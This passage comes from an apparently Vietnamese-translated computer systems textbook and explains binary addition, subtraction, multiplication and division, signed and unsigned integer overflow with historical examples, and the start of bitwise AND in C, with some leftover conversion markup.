<tr><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td></tr>
<tr><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td></tr>
<tr><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td></tr>
<tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr>
</tbody></table>
</div>
<p><strong>Bảng 1.</strong> Tám khả năng khi cộng hai bit (<em>A</em> và <em>B</em>) với khả năng có số nhớ từ chữ số trước.</p>
<p>Xét ví dụ cộng hai số nhị phân 4-bit.<br />
Bắt đầu bằng cách viết thẳng hàng các chữ số sao cho các bit tương ứng nằm cùng cột, sau đó cộng từng cặp bit theo thứ tự từ bit có trọng số thấp nhất (<em>d~0~</em>) đến bit có trọng số cao nhất (<em>d~3~</em>).<br />
Ví dụ, cộng (0b0010 + 0b1011):</p>
<blockquote>
<pre><code>     1    &lt;- Carry 1 từ digit 1 sang digit 2
  0010
+ 1011
--------
  1101
</code></pre>
</blockquote>
<p>Ví dụ trên cho thấy có một số nhớ 1 từ <em>d~1~</em> sang <em>d~2~</em>.<br />
Tình huống này tương tự như khi cộng hai chữ số thập phân mà tổng lớn hơn 9.<br />
Ví dụ: (5 + 8 = 13), chữ số hàng đơn vị là 3 và số 1 được nhớ sang hàng chục.</p>
<p>Toán hạng thứ nhất ((0b0010)) có bit đầu tiên là 0, nên biểu diễn giá trị 2 trong cả hai cách diễn giải: <strong>two’s complement</strong> (bù hai) và <strong>unsigned</strong> (không dấu).<br />
Toán hạng thứ hai ((0b1011)) biểu diễn giá trị -5 nếu hiểu theo <strong>signed two’s complement</strong>, hoặc 11 nếu hiểu theo <strong>unsigned</strong>.<br />
May mắn là cách diễn giải không ảnh hưởng đến các bước tính toán.<br />
Kết quả ((0b1101)) có thể hiểu là 13 (unsigned: (2 + 11)) hoặc -3 (signed: (2 + (-5))), cả hai đều đúng tùy theo cách diễn giải toán hạng thứ hai.</p>
<p>Nói chung, một dãy 4-bit biểu diễn giá trị trong khoảng ([0, 15]) nếu hiểu là <strong>unsigned</strong>, và ([-8, 7]) nếu hiểu là <strong>signed</strong>.<br />
Trong ví dụ trước, kết quả nằm trong khoảng biểu diễn được, nhưng không phải lúc nào cũng vậy.<br />
Ví dụ, khi cộng (0b1100) (unsigned 12) + (0b0111) (7), kết quả đúng phải là 19, nhưng 4-bit không thể biểu diễn 19:</p>
<blockquote>
<pre><code>   11     &lt;- Carry 1 từ digit 2 sang digit 3, và digit 3 tràn ra ngoài giá trị 4-bit
 1100
+0111
-----
 0011
Carry out: 1
</code></pre>
</blockquote>
<p>Lưu ý rằng phép cộng này tạo ra số nhớ 1 từ bit có trọng số cao nhất — đây được gọi là <strong>carry out</strong> của toàn bộ phép toán.<br />
Trong ví dụ này, carry out cho thấy kết quả cần thêm một bit để lưu trữ.<br />
Tuy nhiên, khi thực hiện phép cộng 4-bit, phần cứng sẽ bỏ (truncate) bit nhớ này, để lại kết quả (0b0011).<br />
Nếu mục tiêu là cộng (12 + 7), kết quả 3 chắc chắn gây bất ngờ.<br />
Sự bất ngờ này là do <strong>overflow</strong> (tràn số).<br />
Chúng ta sẽ tìm hiểu cách phát hiện overflow và nguyên nhân gây ra nó trong <a href="C4-Binary/overflow.html#_integer_overflow">phần sau</a>.</p>
<blockquote>
<p>Các mạch cộng nhiều bit (multibit adder circuits) cũng hỗ trợ <strong>carry in</strong>, hoạt động như số nhớ vào bit ngoài cùng bên phải (tức là đầu vào <em>Carry~in~</em> cho <em>d~0~</em>).<br />
Trong phép cộng, carry in thường được đặt ngầm định bằng 0, nên không xuất hiện trong ví dụ trước.<br />
Tuy nhiên, carry in trở nên quan trọng trong các phép toán khác sử dụng mạch cộng, đặc biệt là <a href="C4-Binary/arithmetic_subtraction.html#_subtraction">subtraction</a>.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h3 id="442-phép-trừ-subtraction"><a class="header" href="#442-phép-trừ-subtraction">4.4.2. Phép trừ (Subtraction)</a></h3>
<p>Phép trừ kết hợp hai thao tác quen thuộc: <strong>negation</strong> (phủ định) và <strong>addition</strong> (cộng).<br />
Nói cách khác, phép trừ (7 - 3) tương đương với việc viết lại thành (7 + (-3)).<br />
Cách diễn đạt này phù hợp với cách phần cứng hoạt động — CPU vốn đã có mạch thực hiện <strong>negation</strong> và <strong>addition</strong>, nên việc tái sử dụng các mạch này hợp lý hơn là xây dựng hẳn một mạch trừ riêng.<br />
Hãy nhớ rằng một <strong>procedure</strong> (thủ tục) đơn giản để phủ định một số nhị phân là <strong><a href="C4-Binary/signed.html#_negation">flip the bits and add one</a></strong> (đảo tất cả các bit rồi cộng thêm 1).</p>
<p>Xét ví dụ (0b0111) (7) − (0b0011) (3).<br />
Bước đầu tiên là đưa số 3 vào mạch đảo bit.<br />
Để thực hiện phần “+1”, ta tận dụng <strong>carry in</strong> (số nhớ vào) của mạch cộng.<br />
Tức là, thay vì số nhớ được truyền từ chữ số này sang chữ số khác, phép trừ sẽ đưa một <strong>carry in</strong> vào <em>d~0~</em> của mạch cộng.<br />
Đặt <strong>carry in</strong> bằng 1 sẽ tăng giá trị ở hàng đơn vị thêm một đơn vị — chính xác là phần “+1” cần thiết trong phép phủ định.<br />
Kết hợp tất cả lại, ví dụ sẽ như sau:</p>
<blockquote>
<pre><code>     1 (carry in)         1 (carry in)
  0111                 0111
- 0011               + 1100 (bits flipped)

  Result:   0100
  Carry out: 1
</code></pre>
</blockquote>
<p>Mặc dù kết quả đầy đủ của phép cộng này tạo ra một bit nhớ sang chữ số ngoài cùng bên trái, nhưng khi bỏ bớt (truncate) bit đó, ta thu được (0b0100), đúng với kết quả mong đợi là 4.<br />
Không giống như ví dụ phép cộng trước, <strong>carry out</strong> từ bit có trọng số cao nhất trong phép trừ <strong>không nhất thiết</strong> là dấu hiệu của lỗi <strong>overflow</strong> (tràn số).</p>
<p>Thực hiện phép trừ bằng cách phủ định rồi cộng cũng hoạt động khi trừ một số âm.<br />
Ví dụ, (7 - (-3)) cho kết quả 10:</p>
<blockquote>
<pre><code>     1 (carry in)         1 (carry in)
  0111                 0111
- 1101               + 0010 (bits flipped)

  Result:   1010
  Carry out: 0
</code></pre>
</blockquote>
<p>Chúng ta sẽ tìm hiểu sâu hơn về ý nghĩa của việc có hoặc không có <strong>carry out</strong> trong <a href="C4-Binary/overflow.html#_integer_overflow">phần overflow</a>.</p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="443-phép-nhân-và-phép-chia-multiplication-and-division"><a class="header" href="#443-phép-nhân-và-phép-chia-multiplication-and-division">4.4.3. Phép nhân và phép chia (Multiplication and Division)</a></h3>
<p>Phần này mô tả ngắn gọn về phép nhân và phép chia nhị phân với số nguyên.<br />
Cụ thể, nó trình bày các phương pháp tính toán bằng tay và <strong>không</strong> phản ánh hành vi của phần cứng hiện đại.<br />
Mô tả này không nhằm mục đích bao quát toàn bộ, vì phần còn lại của chương chủ yếu tập trung vào phép cộng và phép trừ.</p>
<h4 id="phép-nhân-multiplication"><a class="header" href="#phép-nhân-multiplication">Phép nhân (Multiplication)</a></h4>
<p>Để nhân các số nhị phân, ta sử dụng chiến lược quen thuộc khi làm trên giấy: xét từng chữ số một và cộng các kết quả lại.<br />
Ví dụ, nhân (0b0101) (5) và (0b0011) (3) tương đương với việc cộng:</p>
<ul>
<li>Kết quả của việc nhân <strong>d~0~</strong> với (0b0101) (5): (0b0101) (5)</li>
<li>Kết quả của việc nhân <strong>d~1~</strong> với (0b0101) (5) và dịch trái kết quả một chữ số: (0b1010) (10)</li>
</ul>
<blockquote>
<pre><code>  0101       0101       0101
x 0011  =  x    1  +  x   10  =  101 + 1010  =  1111 (15)
</code></pre>
</blockquote>
<h4 id="phép-chia-số-nguyên-integer-division"><a class="header" href="#phép-chia-số-nguyên-integer-division">Phép chia số nguyên ((Integer) Division)</a></h4>
<p>Không giống như các phép toán vừa mô tả ở trên, phép chia có khả năng tạo ra kết quả <strong>không nguyên</strong>.<br />
Điều quan trọng nhất cần nhớ khi chia số nguyên là trong hầu hết các ngôn ngữ lập trình (ví dụ: C, Python 2, và Java), phần thập phân của kết quả sẽ bị <strong>truncation</strong> (cắt bỏ).<br />
Ngoài ra, phép chia nhị phân sử dụng cùng phương pháp chia dài (long division) mà hầu hết học sinh được học ở tiểu học.<br />
Ví dụ, dưới đây là cách tính (11 / 3) cho kết quả nguyên bằng 3:</p>
<blockquote>
<pre><code>    ____ 
11 |1011

    00__   11 (3) không chia hết cho 1 (1) hoặc 10 (2),
11 |1011   nên hai chữ số đầu tiên của kết quả là 00.

    001_   11 (3) chia vào 101 (5) được một lần.
11 |1011

    101    101 (5) - 11 (3) còn lại 10 (2).
  -  11
     10

    0011
11 |1011   11 (3) chia vào 101 (5) được một lần nữa.
     101
</code></pre>
</blockquote>
<p>Tại thời điểm này, phép toán đã cho ra kết quả nguyên mong đợi là (0b0011) (3), và phần cứng sẽ bỏ qua (truncate) bất kỳ phần thập phân nào.<br />
Nếu bạn muốn xác định <strong>phần dư nguyên</strong> (integral remainder), hãy sử dụng toán tử <strong>modulus</strong> (%);<br />
ví dụ: (11 % 3 = 2).</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="45-tràn-số-nguyên-integer-overflow"><a class="header" href="#45-tràn-số-nguyên-integer-overflow">4.5. Tràn số nguyên (Integer Overflow)</a></h2>
<p>Mặc dù về mặt toán học, tập hợp các số nguyên là vô hạn, nhưng trong thực tế, các kiểu dữ liệu số trong bộ nhớ máy tính <a href="C4-Binary/bases.html#_storage_limitations">chiếm một số bit cố định</a>.<br />
Như đã gợi ý xuyên suốt chương này, việc sử dụng số bit cố định đồng nghĩa với việc chương trình có thể <strong>không thể</strong> biểu diễn một số giá trị mà nó muốn lưu trữ.<br />
Ví dụ, phần thảo luận về phép cộng đã cho thấy rằng việc cộng hai giá trị hợp lệ có thể tạo ra <a href="C4-Binary/arithmetic_addition.html#carryout">một kết quả không thể biểu diễn</a>.<br />
Một phép tính không có đủ dung lượng để lưu trữ kết quả của nó được gọi là <strong>overflow</strong> (tràn số).</p>
<h3 id="451-phép-so-sánh-với-đồng-hồ-đo-quãng-đường-odometer-analogy"><a class="header" href="#451-phép-so-sánh-với-đồng-hồ-đo-quãng-đường-odometer-analogy">4.5.1. Phép so sánh với đồng hồ đo quãng đường (Odometer Analogy)</a></h3>
<p>Để hình dung về overflow, hãy xét một ví dụ ngoài lĩnh vực máy tính: <strong>odometer</strong> (đồng hồ đo quãng đường) của ô tô.<br />
Odometer đếm số dặm xe đã chạy, và dù là loại cơ hay điện tử, nó chỉ có thể hiển thị một số lượng chữ số (cơ số 10) nhất định.<br />
Nếu xe chạy nhiều hơn số dặm mà odometer có thể biểu diễn, nó sẽ <strong>quay vòng</strong> về 0, vì giá trị thực không thể hiển thị.<br />
Ví dụ, với odometer 6 chữ số, giá trị lớn nhất là 999999.<br />
Chạy thêm 1 dặm <em>lẽ ra</em> sẽ hiển thị 1000000, nhưng giống như <a href="C4-Binary/arithmetic_addition.html#carryout">ví dụ phép cộng bị tràn</a>, số 1 bị “carry out” ra ngoài 6 chữ số, để lại 000000.</p>
<p>Để đơn giản, giả sử odometer chỉ có <strong>1 chữ số thập phân</strong>.<br />
Nó biểu diễn phạm vi [0, 9], nên sau mỗi 10 dặm, odometer sẽ quay lại 0.<br />
Nếu minh họa phạm vi này, ta có thể vẽ như <a href="C4-Binary/overflow.html#FigBaseTenWheel">Hình 1</a>:</p>
<p><img src="C4-Binary/_images/BaseTenWheel.png" alt="A circle with the values 0 to 9 arranged around it." /></p>
<p><strong>Hình 1.</strong> Minh họa trực quan các giá trị có thể của odometer 1 chữ số.</p>
<p>Vì odometer 1 chữ số quay vòng khi đạt 10, việc vẽ nó thành hình tròn giúp nhấn mạnh điểm <strong>gián đoạn</strong> ở đỉnh vòng tròn (và <em>chỉ</em> ở đó).<br />
Cụ thể, khi cộng 1 vào bất kỳ giá trị nào <em>khác 9</em>, kết quả sẽ là giá trị mong đợi.<br />
Ngược lại, cộng 1 vào 9 sẽ nhảy sang 0 — một giá trị không liền kề theo thứ tự tự nhiên.<br />
Nói chung, bất kỳ phép toán nào vượt qua điểm gián đoạn giữa 9 và 0 đều gây ra overflow.</p>
<p>Ví dụ, xét phép cộng (8 + 4) như trong <a href="C4-Binary/overflow.html#FigBaseTenWheelAdding">Hình 2</a>:</p>
<p><img src="C4-Binary/_images/BaseTenWheelAdding.png" alt="A circle with the values 0 to 9 arranged around it. The gap between 0 and 9 is labeled as the location where overflow can occur. Arrows show that adding 4 to 8 causes the arithmetic to jump across the marked overflow location." /></p>
<p><strong>Hình 2.</strong> Kết quả của (8 + 4) với chỉ một chữ số thập phân.<br />
Việc vượt qua điểm gián đoạn giữa 0 và 9 cho thấy overflow đã xảy ra.</p>
<p>Trong ví dụ này, tổng thu được là 2 thay vì 12 như mong đợi.<br />
Lưu ý rằng nhiều giá trị khác cộng với 8 (ví dụ: (8 + 14)) cũng sẽ cho ra 2, chỉ khác ở chỗ phép tính sẽ “quay vòng” nhiều lần hơn.<br />
Do đó, không quan trọng xe chạy 2, 12 hay 152 dặm — cuối cùng odometer vẫn hiển thị 2.</p>
<p>Bất kỳ thiết bị nào hoạt động như odometer đều thực hiện <strong>modular arithmetic</strong> (số học mô-đun).<br />
Trong trường hợp này, mọi phép toán đều được tính theo mô-đun 10, vì một chữ số thập phân chỉ biểu diễn được 10 giá trị.<br />
Do đó, với bất kỳ số dặm nào, ta có thể tính giá trị odometer hiển thị bằng cách chia số dặm cho 10 và lấy <strong>phần dư</strong>.<br />
Nếu odometer có 2 chữ số thay vì 1, mô-đun sẽ là 100, vì nó có thể biểu diễn phạm vi [0, 99].<br />
Tương tự, đồng hồ cũng thực hiện số học mô-đun với mô-đun giờ là 12.</p>
<h3 id="452-tràn-số-nguyên-nhị-phân-binary-integer-overflow"><a class="header" href="#452-tràn-số-nguyên-nhị-phân-binary-integer-overflow">4.5.2. Tràn số nguyên nhị phân (Binary Integer Overflow)</a></h3>
<p>Sau khi đã thấy một dạng overflow quen thuộc, giờ hãy xét cách biểu diễn số trong hệ nhị phân.<br />
Nhớ rằng <em>N</em> bit lưu trữ có thể biểu diễn (2^N) chuỗi bit khác nhau, và các chuỗi này có thể được diễn giải theo nhiều cách (<em>unsigned</em> hoặc <em>signed</em>).<br />
Một số phép toán có thể cho kết quả đúng theo một cách diễn giải, nhưng lại gây overflow theo cách diễn giải khác, nên phần cứng cần nhận biết overflow theo từng trường hợp.</p>
<p>Ví dụ, giả sử máy dùng chuỗi 4 bit để tính (0b0010) (2) − (0b0101) (5).<br />
Thực hiện phép toán này theo <a href="C4-Binary/arithmetic_subtraction.html#_subtraction">thủ tục trừ</a> cho ra kết quả nhị phân (0b1101).</p>
<ul>
<li>Nếu diễn giải kết quả này là <strong>signed</strong>: ( -8 + 4 + 1 = -3 ) → đúng với kết quả mong đợi của (2 - 5), <strong>không</strong> bị overflow.</li>
<li>Nếu diễn giải là <strong>unsigned</strong>: ( 8 + 4 + 1 = 13 ) → sai, rõ ràng là dấu hiệu của overflow.</li>
</ul>
<p>Xem xét kỹ hơn, điều này khá hợp lý — kết quả lẽ ra phải là số âm, và cách diễn giải signed cho phép số âm, trong khi unsigned thì không.</p>
<h4 id="tràn-số-nguyên-không-dấu-unsigned-overflow"><a class="header" href="#tràn-số-nguyên-không-dấu-unsigned-overflow">Tràn số nguyên không dấu (Unsigned Overflow)</a></h4>
<p>Các số <strong>unsigned</strong> (không dấu) hoạt động tương tự như ví dụ odometer (đồng hồ đo quãng đường) ở hệ thập phân, vì cả hai chỉ biểu diễn các giá trị không âm.<br />
Với <em>N</em> bit, giá trị unsigned nằm trong phạm vi [0, (2^N - 1)], khiến mọi phép toán đều là <strong>modular arithmetic</strong> (số học mô-đun) theo mô-đun (2^N).<br />
Hình 3 minh họa cách sắp xếp các giá trị unsigned 4-bit trong một không gian mô-đun.</p>
<p><img src="C4-Binary/_images/UnsignedWheel.png" alt="The numbers 0 to 15 are arranged in a circle. The gap between 15 and 0 (at the top of the circle) is labeled as the location where overflow can occur." /></p>
<p><strong>Hình 3.</strong> Sắp xếp các giá trị unsigned 4-bit trong không gian mô-đun. Mọi phép toán đều là mô-đun theo (2^4 = 16).</p>
<p>Vì cách diễn giải unsigned không thể chứa giá trị âm, điểm gián đoạn lại nằm giữa giá trị lớn nhất và số 0.<br />
Do đó, <strong>unsigned overflow</strong> xảy ra khi bất kỳ phép toán nào vượt qua ranh giới giữa (2^N - 1) và 0.<br />
Nói một cách đơn giản, nếu thực hiện phép cộng (lẽ ra kết quả phải <strong>lớn hơn</strong>) nhưng lại cho ra kết quả nhỏ hơn, thì phép cộng đó gây ra unsigned overflow. Ngược lại, nếu thực hiện phép trừ (lẽ ra kết quả phải <strong>nhỏ hơn</strong>) nhưng lại cho ra kết quả lớn hơn, thì phép trừ đó gây ra unsigned overflow.</p>
<p>Một cách rút gọn để phát hiện unsigned overflow trong phép cộng và phép trừ là dựa vào bit <strong>carry out</strong> (số nhớ ra) và <strong>carry in</strong> (số nhớ vào) của các phép toán này:</p>
<ul>
<li><strong>Carry out</strong>: số nhớ ra từ bit có trọng số cao nhất trong kết quả.</li>
<li><strong>Carry in</strong>: số nhớ vào bit có trọng số thấp nhất (d~0~) của phép toán.<br />
Trong phép trừ, carry in được đặt thành 1 như một phần của <strong>negation procedure</strong> (thủ tục phủ định).</li>
</ul>
<p><strong>Quy tắc rút gọn cho số học unsigned</strong>:<br />
<strong>Carry out</strong> phải <strong>bằng</strong> <strong>carry in</strong>, nếu không thì phép toán gây ra overflow.</p>
<p>Trực giác của quy tắc này:</p>
<ul>
<li>
<p><strong>Phép cộng</strong> (carry in = 0):<br />
Kết quả phải lớn hơn hoặc bằng toán hạng thứ nhất.<br />
Nếu tổng cần thêm một bit để lưu trữ (carry out = 1), việc cắt bỏ (truncate) bit này sẽ tạo ra kết quả nhỏ hơn → overflow.<br />
Ví dụ: trong không gian số unsigned 4-bit, (0b1100) (12) + (0b1101) (13) cần <strong>5 bit</strong> để lưu (0b1,1001) (25).<br />
Khi cắt còn 4 bit, kết quả là (0b1001) (9), nhỏ hơn các toán hạng → overflow.</p>
</li>
<li>
<p><strong>Phép trừ</strong> (carry in = 1):<br />
Kết quả phải nhỏ hơn hoặc bằng toán hạng thứ nhất.<br />
Vì phép trừ được thực hiện như cộng với số phủ định, nên phép cộng này lẽ ra phải cho kết quả nhỏ hơn.<br />
Cách duy nhất để phép cộng cho ra giá trị nhỏ hơn là khi cần cắt bớt bit (carry out = 1).<br />
Nếu không cần cắt (carry out = 0), phép trừ sẽ cho kết quả lớn hơn → overflow.</p>
</li>
</ul>
<p><strong>Ví dụ 1 – Tràn số</strong>: (0b0111) (7) − (0b1001) (9)<br />
Thủ tục trừ xử lý như sau:</p>
<blockquote>
<pre><code> 1 (carry in)         1 (carry in)
 0111                 0111
-1001               + 0110 (bits flipped)

 Result:   1110
 Carry out: 0
</code></pre>
</blockquote>
<p>Phép tính <strong>không</strong> tạo carry out từ d~3~, nên không có cắt bớt bit.<br />
Carry in (1) <strong>không khớp</strong> với carry out (0) → overflow.<br />
Kết quả (0b1110) (14) lớn hơn cả hai toán hạng, rõ ràng sai cho (7 - 9).</p>
<p><strong>Ví dụ 2 – Không tràn số</strong>: (0b0111) (7) − (0b0101) (5)<br />
Thủ tục trừ xử lý như sau:</p>
<blockquote>
<pre><code> 1 (carry in)         1 (carry in)
 0111                 0111
-0101               + 1010 (bits flipped)

 Result:   0010
 Carry out: 1
</code></pre>
</blockquote>
<p>Phép tính tạo carry out sang d~4~, nên carry in (1) <strong>khớp</strong> với carry out (1) → không overflow.<br />
Kết quả (0b0010) (2) đúng với (7 - 5).</p>
<h4 id="tràn-số-nguyên-có-dấu-signed-overflow"><a class="header" href="#tràn-số-nguyên-có-dấu-signed-overflow">Tràn số nguyên có dấu (Signed Overflow)</a></h4>
<p>Nguyên tắc trực giác về overflow cũng áp dụng cho cách diễn giải số nhị phân <strong>signed</strong> (có dấu): tồn tại một <strong>điểm gián đoạn</strong> trong không gian số mô-đun.<br />
Tuy nhiên, vì cách diễn giải signed cho phép giá trị âm, điểm gián đoạn <strong>không</strong> xảy ra quanh số 0.<br />
Hãy nhớ rằng <a href="C4-Binary/signed.html#_twos_complement">two’s complement</a> (bù hai) “quay vòng” mượt mà từ -1 (<code>0b1111...111</code>) sang 0 (<code>0b0000...000</code>).<br />
Do đó, điểm gián đoạn nằm ở <strong>đầu kia</strong> của không gian số, nơi giá trị dương lớn nhất và giá trị âm nhỏ nhất gặp nhau.</p>
<p>Hình 4 minh họa cách sắp xếp các giá trị signed 4-bit trong một không gian mô-đun.<br />
Lưu ý rằng một nửa giá trị là âm, nửa còn lại là không âm, và điểm gián đoạn nằm ở ranh giới min/max giữa chúng.</p>
<p><img src="C4-Binary/_images/SignedWheel.png" alt="The numbers 0 to 7 are arranged on the right half of a circle, and the numbers -1 to -8 are arranged on the left half. The gap between 7 and -8 (at the bottom of the circle) is labeled as the location where overflow can occur." /></p>
<p><strong>Hình 4.</strong> Sắp xếp các giá trị signed 4-bit trong không gian mô-đun.<br />
Vì cách diễn giải signed cho phép giá trị âm, điểm gián đoạn không còn nằm ở số 0.</p>
<p>Khi thực hiện số học signed, việc tạo ra kết quả <strong>tiến gần về 0</strong> luôn an toàn.<br />
Nói cách khác, bất kỳ phép toán nào làm giảm giá trị tuyệt đối của kết quả sẽ <strong>không thể</strong> gây overflow, vì điểm gián đoạn nằm ở nơi độ lớn của giá trị biểu diễn được là lớn nhất.</p>
<p>Do đó, hệ thống phát hiện overflow trong phép cộng và phép trừ signed bằng cách so sánh <strong>bit có trọng số cao nhất</strong> (most significant bit) của các toán hạng với bit có trọng số cao nhất của kết quả.<br />
Với phép trừ, trước tiên hãy viết lại phép toán dưới dạng phép cộng (ví dụ: viết lại (5 - 2) thành (5 + (-2))).</p>
<ul>
<li>Nếu hai toán hạng của phép cộng có <strong>bit cao nhất khác nhau</strong> (tức là một số âm, một số dương), sẽ <strong>không thể</strong> xảy ra signed overflow, vì giá trị tuyệt đối của kết quả phải nhỏ hơn hoặc bằng một trong hai toán hạng. Kết quả đang tiến <strong>về phía</strong> 0.</li>
<li>Nếu hai toán hạng có <strong>bit cao nhất giống nhau</strong> (cùng dương hoặc cùng âm), kết quả đúng cũng phải có bit cao nhất giống như vậy.<br />
Do đó, khi cộng hai số cùng dấu, signed overflow xảy ra nếu <strong>dấu của kết quả khác</strong> dấu của các toán hạng.</li>
</ul>
<p><strong>Ví dụ với số nhị phân signed 4-bit:</strong></p>
<ul>
<li>(5 - 4) tương đương (5 + (-4)). Toán hạng thứ nhất (5) là dương, toán hạng thứ hai (-4) là âm → kết quả tiến về 0 → <strong>không overflow</strong>.</li>
<li>(4 + 2) (cả hai dương) cho ra 6 (dương) → <strong>không overflow</strong>.</li>
<li>(-5 - 1) tương đương (-5 + (-1)) (cả hai âm) cho ra -6 (âm) → <strong>không overflow</strong>.</li>
<li>(4 + 5) (cả hai dương) cho ra -7 (âm) → dấu kết quả khác dấu toán hạng → <strong>overflow</strong>.</li>
<li>(-3 - 8) tương đương (-3 + (-8)) (cả hai âm) cho ra 5 (dương) → dấu kết quả khác dấu toán hạng → <strong>overflow</strong>.</li>
</ul>
<h3 id="453-tóm-tắt-về-overflow"><a class="header" href="#453-tóm-tắt-về-overflow">4.5.3. Tóm tắt về Overflow</a></h3>
<p>Nói chung, <strong>integer overflow</strong> xảy ra khi một phép toán số học vượt qua ranh giới giữa giá trị nhỏ nhất và lớn nhất mà kết quả có thể biểu diễn.<br />
Nếu không chắc về quy tắc overflow của signed và unsigned, hãy xét giá trị min và max của chuỗi N-bit:</p>
<ul>
<li><strong>Unsigned</strong>:
<ul>
<li>Min = 0 (vì unsigned không biểu diễn số âm)</li>
<li>Max = (2^N - 1) (vì một chuỗi bit dành cho số 0)<br />
→ Điểm gián đoạn nằm giữa (2^N - 1) và 0.</li>
</ul>
</li>
<li><strong>Signed</strong>:
<ul>
<li>Min = (-2^{N-1}) (vì một nửa chuỗi bit dành cho số âm)</li>
<li>Max = (2^{N-1} - 1) (vì trong nửa còn lại, một giá trị dành cho số 0)<br />
→ Điểm gián đoạn nằm giữa (2^{N-1} - 1) và (-2^{N-1}).</li>
</ul>
</li>
</ul>
<h3 id="454-hệ-quả-của-overflow"><a class="header" href="#454-hệ-quả-của-overflow">4.5.4. Hệ quả của Overflow</a></h3>
<p>Mặc dù bạn có thể không thường xuyên gặp integer overflow, nhưng khi xảy ra, nó có thể phá vỡ chương trình theo những cách đáng chú ý (và đôi khi <strong>thảm khốc</strong>).</p>
<ul>
<li>
<p><strong>Ví dụ 1 – YouTube &amp; Gangnam Style (2014)</strong>:<br />
Video <a href="https://en.wikipedia.org/wiki/Gangnam_Style">Gangnam Style</a> của PSY suýt làm tràn bộ đếm 32-bit mà YouTube dùng để theo dõi lượt xem.<br />
Kết quả là YouTube đã chuyển sang dùng bộ đếm 64-bit.</p>
</li>
<li>
<p><strong>Ví dụ 2 – Pac-Man (1980)</strong>:<br />
Trò chơi arcade <em>Pac-Man</em> dùng giá trị unsigned 8-bit để lưu cấp độ người chơi.<br />
Khi vượt qua cấp 255 (max của unsigned 8-bit), nửa bàn chơi bị lỗi hiển thị nghiêm trọng như trong Hình 5.</p>
</li>
</ul>
<p><img src="C4-Binary/_images/Pacman.png" alt="The right half of the game board is completely corrupted with nonsense." /></p>
<p><strong>Hình 5.</strong> Bàn chơi <em>Pac-Man</em> “loạn” khi đạt cấp 256.</p>
<ul>
<li><strong>Ví dụ 3 – Therac-25 (1980s)</strong>:<br />
Máy xạ trị <a href="https://en.wikipedia.org/wiki/Therac-25">Therac-25</a> gặp nhiều lỗi thiết kế, trong đó có một lỗi tăng giá trị biến cờ logic (truth flag) thay vì gán hằng số.<br />
Sau đủ số lần sử dụng, biến này bị overflow, quay về 0 (false) và bỏ qua cơ chế an toàn.<br />
Hậu quả: gây thương tích nghiêm trọng (và trong một số trường hợp tử vong) cho 6 bệnh nhân.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="46-bitwise-operators"><a class="header" href="#46-bitwise-operators">4.6. Bitwise Operators</a></h2>
<p>In addition to the standard arithmetic operations described earlier,
CPUs also support operations that are uncommon outside of binary. These
<strong>bitwise operators</strong> directly apply the behavior of <a href="C4-Binary/../C5-Arch/gates.html#_basic_logic_gates">logic
gates</a> to bit
sequences, making them straightforward to implement efficiently in
hardware. Unlike addition and subtraction, which programmers typically
use to manipulate a variable's numerical interpretation, programmers
commonly use bitwise operators to modify specific bits in a variable.
For example, a program might encode a certain bit position in a variable
to hold a true/false meaning, and bitwise operations allow the program
to manipulate the variable's individual bits to change that specific
bit.</p>
<h3 id="461-bitwise-and"><a class="header" href="#461-bitwise-and">4.6.1. Bitwise AND</a></h3>
<p>The bitwise AND operator (<code>&amp;</code>) evaluates two input bit sequences. For
each digit of the inputs, it outputs a 1 in the corresponding position
of the output if <em>both</em> inputs are 1 in that position. Otherwise, it
outputs a 0 for the digit. Table 1 shows the truth table
for the bitwise AND of two values, <em>A</em> and <em>B</em>.</p>
<p>+-----------------+-----------------+-----------------------------------+
| A               | B               | A &amp; B                             |
+=================+=================+===================================+
| 0               | 0               | 0                                 |
+-----------------+-----------------+-----------------------------------+
| 0               | 1               | 0                                 |
+-----------------+-----------------+-----------------------------------+
| 1               | 0               | 0                                 |
+-----------------+-----------------+-----------------------------------+
| 1               | 1               | 1                                 |
+-----------------+-----------------+-----------------------------------+</p>
<p>: Table 1. The Results of Bitwise ANDing Two Values (<em>A</em> AND <em>B</em>)</p>
<p>For example, to bitwise AND 0b011010 with 0b110110, start by lining up
the two sequences. Checking vertically through each digit, set the
result of the column to 1 if <em>both</em> digits are 1. Otherwise, set the
result of the column to 0:</p>
<pre><code>        011010
    AND 110110  Only digits 1 and 4 are 1's in BOTH inputs, so
Result: 010010  those are the only digits set to 1 in the output.
</code></pre>
<p>To perform a bitwise AND in C, place C's bitwise AND operator (<code>&amp;</code>)
between two operand variables. Here's the same example again, performed
in C:</p>
<pre><code>int x = 26;
int y = 54;

printf(&quot;Result: %d\n&quot;, x &amp; y);  // Prints 18
</code></pre>
<p>+-----------------------------------+-----------------------------------+
|                                   |                          |
|                                   | Bitwise Operations versus Logical |
|                                   | Truth Operations                  |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | Be careful not to conflate        |
|                                   | bitwise operators with [logical   |
|                                   | truth                             |
|                                   | operat                            |
|                                   | ors](../C1-C_intro/conditionals.h |
|                                   | tml#_boolean_values_in_c). |
|                                   | Despite having similar names      |
|                                   | (AND, OR, NOT, etc.), the two     |
|                                   | <em>are not</em> the same:               |
|                                   | :::                               |
|                                   |                                   |
|                                   |                          |
|                                   | -   Bitwise operators consider    |
|                                   |     each bit of their inputs      |
|                                   |     independently and produce an  |
|                                   |     output bit sequence as a      |
|                                   |     function of the specific      |
|                                   |     input bits that are set.      |
|                                   |                                   |
|                                   | -   Logical operators consider    |
|                                   |     only the <em>truth</em>              |
|                                   |     interpretation of their       |
|                                   |     operands. To C, a value of    |
|                                   |     zero is <em>false</em>, whereas all  |
|                                   |     other values are considered   |
|                                   |     <em>true</em>. Logical operators are |
|                                   |     often used when evaluating    |
|                                   |     conditionals (e.g., <code>if</code>      |
|                                   |     statements).                  |
|                                   | :::                               |
|                                   |                                   |
|                                   | ::: paragraph                     |
|                                   | Note that C often uses similar    |
